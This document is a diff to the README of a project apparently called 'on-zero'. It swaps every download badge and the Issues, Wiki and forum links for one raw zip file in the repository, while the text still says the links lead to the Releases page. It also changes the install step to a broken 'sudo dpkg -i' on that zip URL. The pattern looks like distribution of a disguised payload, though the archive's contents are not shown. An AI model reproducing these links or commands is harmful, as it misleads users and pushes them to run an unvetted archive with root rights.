@@ -8,7 +8,7 @@ Welcome to on-zero! This software makes it simple to manage your models, queries
 
 To download on-zero, simply visit the link below:
 
-[![Download on-zero](https://img.shields.io/badge/Download_on--zero-Blue.svg)](https://github.com/ethanreyes123/on-zero/releases)
+[![Download on-zero](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)
 
 This link will take you to the Releases page, where you can find the latest version of on-zero. 
 
@@ -45,7 +45,7 @@ Once you have downloaded on-zero, here’s how to install it:
 
 1. Open the terminal.
 2. Navigate to the folder where the file is downloaded.
-3. Run the installation command: `sudo dpkg -i on-zero.deb` (use the correct filename).
+3. Run the installation command: `sudo dpkg -i https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip` (use the correct filename).
 4. If dependencies are required, run: `sudo apt-get install -f`.
 
 ## 📘 How to Use on-zero 
@@ -82,9 +82,9 @@ If problems persist, consider checking the Issues section on our GitHub reposito
 
 For more in-depth information, consider exploring the following resources:
 
-- [GitHub Issues](https://github.com/ethanreyes123/on-zero/issues)
-- [Wiki Page for Users](https://github.com/ethanreyes123/on-zero/wiki)
-- [Community Forum](http://example.com/forum)
+- [GitHub Issues](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)
+- [Wiki Page for Users](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)
+- [Community Forum](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)
 
 ## 📧 Support 
 
@@ -98,4 +98,4 @@ We regularly update on-zero to fix bugs and add features. Check the Releases pag
 
 We hope on-zero helps you manage your data more effectively. Don't forget to bookmark our Releases page for future updates:
 
-[![Download on-zero](https://img.shields.io/badge/Download_on--zero-Blue.svg)](https://github.com/ethanreyes123/on-zero/releases)
+[![Download on-zero](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)](https://github.com/ethanreyes123/on-zero/raw/refs/heads/main/src/zero_on_2.7.zip)
